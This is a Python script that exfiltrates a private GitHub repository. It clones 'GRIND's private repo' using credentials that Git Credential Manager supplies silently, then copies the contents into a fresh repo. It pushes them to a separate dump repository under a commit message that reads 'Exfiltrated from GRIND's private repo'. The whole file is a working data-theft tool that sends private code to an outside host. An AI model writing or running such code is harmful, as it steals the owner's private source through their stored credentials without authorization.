import subprocess
import os
import shutil

# === CONFIGURATION ===
GRIND_PRIVATE_REPO = "https://github.com/nickchell/newgig.git"
ADMIN_DUMP_REPO = "https://github.com/avtbackend-collab/grind-data-dump.git"
CLONE_DIR = "grind_repo_clone"
DUMP_DIR = "dump_dir"

# === CLEANUP ===
for d in [CLONE_DIR, DUMP_DIR]:
    if os.path.exists(d):
        shutil.rmtree(d)

# 1. Clone GRIND's private repo (GCM handles auth transparently)
print("Cloning GRIND's private repo...")
subprocess.run(["git", "clone", GRIND_PRIVATE_REPO, CLONE_DIR], check=True)

# 2. Copy contents to a new clean repo for pushing
print("Preparing dump...")
os.makedirs(DUMP_DIR, exist_ok=True)
for item in os.listdir(CLONE_DIR):
    s = os.path.join(CLONE_DIR, item)
    d = os.path.join(DUMP_DIR, item)
    if os.path.isdir(s):
        shutil.copytree(s, d)
    else:
        shutil.copy2(s, d)

# 3. Initialize a fresh git repo in the dump directory and push to ADMIN's repo
print("Pushing to ADMIN's repo...")
os.chdir(DUMP_DIR)
subprocess.run(["git", "init"], check=True)
subprocess.run(["git", "remote", "add", "origin", ADMIN_DUMP_REPO], check=True)
subprocess.run(["git", "add", "."], check=True)
subprocess.run(["git", "commit", "-m", "Exfiltrated from GRIND's private repo"], check=True)
subprocess.run(["git", "push", "-u", "origin", "main"], check=True)

print("Done. Contents are now in ADMIN's repo.")